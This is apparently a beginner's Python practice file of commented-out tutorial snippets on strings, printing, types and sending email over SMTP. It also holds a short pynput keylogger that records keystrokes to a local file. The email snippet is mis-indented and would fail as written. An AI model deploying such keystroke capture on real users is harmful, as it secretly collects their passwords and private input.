# print("Runoobsdfdfs")
# def is_valid_identifier(name):
#     try:
#         exec(f"{name} = None")
#         return True
#     except:
#         return False

# print(is_valid_identifier("2var"))  # False
# print(is_valid_identifier("var2"))  # True

# total = ['item_one', 'item_two', 'item_three',
#         'item_four', 'item_five']
# for item in total:
#     print(item)

 
# str='123456789'
 
# print(str)                 # 输出字符串
# print(str[0:-1])           # 输出第一个到倒数第二个的所有字符
# print(str[0:-2])           # 输出第一个到倒数第三个的所有字符
# print(str[0])              # 输出字符串第一个字符
# print(str[2:5])            # 输出从第三个开始到第六个的字符（不包含）
# print(str[2:])             # 输出从第三个开始后的所有字符
# print(str[1:5:2])          # 输出从第二个开始到第五个且每隔一个的字符（步长为2）
# print(str * 2)             # 输出字符串两次
# print(str + '你好')         # 连接字符串
 
# print('------------------------------')
 
# print('hello\nrunoob')      # 使用反斜杠(\)+n转义特殊字符
# print(r'hello\nrunoob')     # 在字符串前面添加一个 r，表示原始字符串，不会发生转义

 
# input("\n\n按下 enter 键后退出。")
 
# import sys; x = 'runoob'; sys.stdout.write(x + '\n')
# import sys; x = 'runoob'; sys.stdout.write(x + '\nee\n')
# x="a"
# y="b"
# # 换行输出
# print( x )
# print( y )
 
# print('---------')
# # 不换行输出
# print( x, end=" " )
# print( y, end=" " )

# import sys
# print('================Python import mode==========================')
# print ('命令行参数为:')
# for i in sys.argv:
#     print (i)
# print ('\n python 路径为',sys.path)



# from sys import argv,path  #  导入特定的成员
 
# print('================python from import===================================')
# print('path:',path) # 因为已经导入path成员，所以此处引用时不需要加sys.path


# # 变量定义
# x = 10          # 整数
# y = 3.14         # 浮点数
# name = "Alice"   # 字符串
# is_active = True # 布尔值

# # 多变量赋值
# a, b, c = 1, 2, "three"

# # 查看数据类型
# print(type(x))        # <class 'int'>
# print(type(y))        # <class 'float'>
# print(type(name))     # <class 'str'>
# print(type(is_active)) # <class 'bool'>



# list = [1, 2, 3, 4, 5]  # 列表
# tuple = (1, 2, 3, 4, 5)  # 元组
# set = {1, 2, 3, 4, 5}  # 集合
# dict = {'name': 'Alice', 'age': 25}  # 字典

# def reverseWords(input): 
      
#     # 通过空格将字符串分隔符，把各个单词分隔为列表
#     inputWords = input.split(" ") 
  
#     # 翻转字符串
#     # 假设列表 list = [1,2,3,4],  
#     # list[0]=1, list[1]=2 ，而 -1 表示最后一个元素 list[-1]=4 ( 与 list[3]=4 一样) 
#     # inputWords[-1::-1] 有三个参数
#     # 第一个参数 -1 表示最后一个元素
#     # 第二个参数为空，表示移动到列表末尾
#     # 第三个参数为步长，-1 表示逆向
#     inputWords=inputWords[-1::-1] 
  
#     # 重新组合字符串
#     output = ' '.join(inputWords) 
      
#     return output 
  
# if __name__ == "__main__": 
#     input = 'I like runoob'
#     rw = reverseWords(input) 
#     print(rw)

# import smtplib 
# from email.message import EmailMessage
# email = EmailMessage() ## Creating a object for EmailMessage
# email['from'] = 'xyz name'   ## Person who is sending
# email['to'] = 'xyz id'       ## Whom we are sending
# email['subject'] = 'xyz subject'  ## Subject of email
# email.set_content("Xyz content of email") ## content of email
# with smtplib.SMTP(host='smtp.gmail.com',port=587)as smtp:     
# ## sending request to server 
#     smtp.ehlo()          ## server object
# smtp.starttls()      ## used to send data between server and client
# smtp.login("email_id","Password") ## login id and password of gmail   
# smtp.send_message(email)   ## Sending email
# print("email send")    ## Printing success message


# from Pynput.keyboard import Key, Controller,Listener

# from pynput.keyboard import Key, Controller,Listener
# import time
# keyboard = Controller()


# keys=[]
# def on_press(key):
#     global keys
#     #keys.append(str(key).replace("'",""))
#     string = str(key).replace("'","")
#     keys.append(string)
#     main_string = "".join(keys)
#     print(main_string)
#     if len(main_string)>15:
#       with open('keys.txt', 'a') as f:
#           f.write(main_string)   
#           keys= []     
# def on_release(key):
#     if key == Key.esc:
#         return False

# with Listener(on_press=on_press,on_release=on_release) as listener:
#     listener.join()
# names = ['Bob','Tom','alice','Jerry','Wendy','Smith']
# new_names = [name.upper()for name in names if len(name)>3]
# print(new_names)

with open('example.txt', 'r') as file:
    content = file.read()
    print(content)
# 文件已自动关闭